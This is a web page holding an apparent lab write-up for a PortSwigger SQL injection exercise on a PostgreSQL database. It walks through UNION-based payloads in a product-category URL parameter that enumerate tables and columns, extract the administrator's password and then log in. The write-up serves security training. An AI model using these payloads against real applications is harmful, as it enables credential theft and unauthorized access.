<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<link rel="alternate" type="application/rss+xml" href="/Writeups/blog/rss.xml" title="Writeups | datthinh1801 Blog RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Writeups/blog/atom.xml" title="Writeups | datthinh1801 Blog Atom Feed"><title data-react-helmet="true">Lab: SQL injection attack, listing the database contents on non-Oracle databases | Writeups | datthinh1801</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://datthinh1801.github.io/Writeups/docs/PortSwigger/SQL Injection/Lab 09"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Lab: SQL injection attack, listing the database contents on non-Oracle databases | Writeups | datthinh1801"><meta data-react-helmet="true" name="description" content="Task"><meta data-react-helmet="true" property="og:description" content="Task"><link data-react-helmet="true" rel="shortcut icon" href="/Writeups/img/gh_profile.png"><link data-react-helmet="true" rel="canonical" href="https://datthinh1801.github.io/Writeups/docs/PortSwigger/SQL Injection/Lab 09"><link data-react-helmet="true" rel="alternate" href="https://datthinh1801.github.io/Writeups/docs/PortSwigger/SQL Injection/Lab 09" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://datthinh1801.github.io/Writeups/docs/PortSwigger/SQL Injection/Lab 09" hreflang="x-default"><link rel="stylesheet" href="/Writeups/assets/css/styles.6c7d232f.css">
<link rel="preload" href="/Writeups/assets/js/runtime~main.3667c77a.js" as="script">
<link rel="preload" href="/Writeups/assets/js/main.e4ea18af.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_1oUP">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Writeups/"><img src="/Writeups/img/gh_profile.png" alt="My Site Logo" class="themedImage_1VuW themedImage--light_3UqQ navbar__logo"><img src="/Writeups/img/gh_profile.png" alt="My Site Logo" class="themedImage_1VuW themedImage--dark_hz6m navbar__logo"><b class="navbar__title">datthinh1801</b></a><a class="navbar__item navbar__link navbar__link--active" href="/Writeups/docs/intro">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/datthinh1801/Writeups" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_3J9K"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a><div class="react-toggle toggle_3Zt9 react-toggle--disabled"><div class="react-toggle-track" role="button" tabindex="-1"><div class="react-toggle-track-check"><span class="toggle_71bT">ðŸŒœ</span></div><div class="react-toggle-track-x"><span class="toggle_71bT">ðŸŒž</span></div><div class="react-toggle-thumb"></div></div><input type="checkbox" class="react-toggle-screenreader-only" aria-label="Switch between dark and light mode"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_31aa"><button class="clean-btn backToTopButton_35hR" type="button"><svg viewBox="0 0 24 24" width="28"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" fill="currentColor"></path></svg></button><aside class="docSidebarContainer_3Kbt"><div class="sidebar_15mo"><nav class="menu thin-scrollbar menu_Bmed menuWithAnnouncementBar_2WvA"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/Writeups/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">CSAW Qualification 2021</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">CTFlearn</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Network Security Lab</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">OWASP 10 Juice-Shop</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">OverTheWire</a></li><li class="theme-doc-sidebar-item-category menu__list-item"><a class="menu__link menu__link--sublist menu__link--active" href="#">PortSwigger</a><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#" tabindex="0">Authentication</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#" tabindex="0">Directory Traversal</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#" tabindex="0">Information Disclosure</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#" tabindex="0">OS Command Injection</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/README">Topics</a></li><li class="theme-doc-sidebar-item-category menu__list-item"><a class="menu__link menu__link--sublist menu__link--active" href="#" tabindex="0">SQL Injection</a><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 01">Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 02">Lab: SQL injection vulnerability allowing login bypass</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 03">Lab: SQL injection UNION attack, determining the number of columns returned by the query</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 04">Lab: SQL injection UNION attack, finding a column containing text</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 05">Lab: SQL injection UNION attack, retrieving data from other tables</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 06">Lab: SQL injection UNION attack, retrieving multiple values in a single column</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 07">Lab: SQL injection attack, querying the database type and version on Oracle</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 08">Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 09">Lab: SQL injection attack, listing the database contents on non-Oracle databases</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 10">Lab: SQL injection attack, listing the database contents on Oracle</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 11">Lab: Blind SQL injection with conditional responses</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 12">Lab: Blind SQL injection with conditional errors</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 13">Lab: Blind SQL injection with time delays</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 14">Lab: Blind SQL injection with time delays and information retrieval</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 15">Lab: Blind SQL injection with out-of-band interaction</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 16">Lab: Blind SQL injection with out-of-band data exfiltration</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/Writeups/docs/PortSwigger/SQL Injection/README">SQL Injection</a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">UIUCTF 2021</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">websec.fr</a></li></ul></nav></div></aside><main class="docMainContainer_3ufF"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_3FnS"><div class="docItemContainer_33ec"><article><div class="tocCollapsible_1PrD theme-doc-toc-mobile tocMobile_3Hoh"><button type="button" class="clean-btn tocCollapsibleButton_2O1e">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Lab: SQL injection attack, listing the database contents on non-Oracle databases</h1></header><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_31ik" id="task"></a>Task<a class="hash-link" href="#task" title="Direct link to heading">#</a></h2><p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application&#x27;s response so you can use a UNION attack to retrieve data from other tables.</p><p>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</p><p>To solve the lab, log in as the <code>administrator</code> user.</p><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_31ik" id="solution"></a>Solution<a class="hash-link" href="#solution" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_31ik" id="exploit"></a>Exploit<a class="hash-link" href="#exploit" title="Direct link to heading">#</a></h3><p>Steps to explore the number of columns returned in the response as well as which column is string-compatible are the same as previous labs.  </p><p>To check which database it is, I queried the version of the database and the one of PostgreSql works, which means this database is PostgreSql.  </p><p><img src="https://user-images.githubusercontent.com/44528004/130075282-43dff783-130b-4aa5-ba5a-8855f2c60e88.png" alt="image"></p><p>To view all table names, the payload is:</p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly"><pre tabindex="0" class="prism-code language-undefined codeBlock_23N8 thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_39YC"><span class="token-line" style="color:#393A34"><span class="token plain">/filter?category=Pets&#x27;+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o clean-btn">Copy</button></div></div><p>As the result, the table that is likely to contain <code>username</code> and <code>password</code> is <code>users_erggze</code>:  </p><p><img src="https://user-images.githubusercontent.com/44528004/130074155-4594456b-6697-4c6f-a675-277074fc68f8.png" alt="image">  </p><p>Then, to explore the column names in the <code>users_erggze</code> table, the payload is:</p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly"><pre tabindex="0" class="prism-code language-undefined codeBlock_23N8 thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_39YC"><span class="token-line" style="color:#393A34"><span class="token plain">/filter?category=Pets&#x27;+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name=&#x27;users_erggze&#x27;--</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o clean-btn">Copy</button></div></div><p>In the response, the columns that contain <code>username</code> and <code>password</code> are <code>username_kaddvg</code> and <code>password_gtnezs</code> :  </p><p><img src="https://user-images.githubusercontent.com/44528004/130074473-8a0b61f1-8855-4743-94d3-e32fc0492578.png" alt="image"></p><p>To retrieve the password of the <code>administrator</code> user, the following payload is used:</p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly"><pre tabindex="0" class="prism-code language-undefined codeBlock_23N8 thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_39YC"><span class="token-line" style="color:#393A34"><span class="token plain">/filter?category=Pets&#x27;+UNION+SELECT+username_kaddvg,password_gtnezs+FROM+users_erggze+WHERE+username_kaddvg=&#x27;administrator&#x27;--</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o clean-btn">Copy</button></div></div><p><img src="https://user-images.githubusercontent.com/44528004/130074809-af78354d-6b1e-4504-bb35-84dfe9508b68.png" alt="image"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_31ik" id="login"></a>Login<a class="hash-link" href="#login" title="Direct link to heading">#</a></h3><p><img src="https://user-images.githubusercontent.com/44528004/130074922-298ce292-30ad-4760-8cb7-2b18ebbfe6cf.png" alt="image">  </p><p><img src="https://user-images.githubusercontent.com/44528004/130074982-13fca45d-8c3b-4917-8a2e-0f03c1be3a55.png" alt="image"></p><blockquote><p>Solved!</p></blockquote></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/datthinh1801/Writupes/tree/main/website/docs/PortSwigger/SQL Injection/Lab 09.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_2_ui" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_13-_"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 08"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Â« Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/Writeups/docs/PortSwigger/SQL Injection/Lab 10"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Lab: SQL injection attack, listing the database contents on Oracle Â»</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_35-E thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task" class="table-of-contents__link">Task</a></li><li><a href="#solution" class="table-of-contents__link">Solution</a><ul><li><a href="#exploit" class="table-of-contents__link">Exploit</a></li><li><a href="#login" class="table-of-contents__link">Login</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2021 datthinh1801. Built with Docusaurus.</div></div></div></footer></div>
<script src="/Writeups/assets/js/runtime~main.3667c77a.js"></script>
<script src="/Writeups/assets/js/main.e4ea18af.js"></script>
</body>
</html>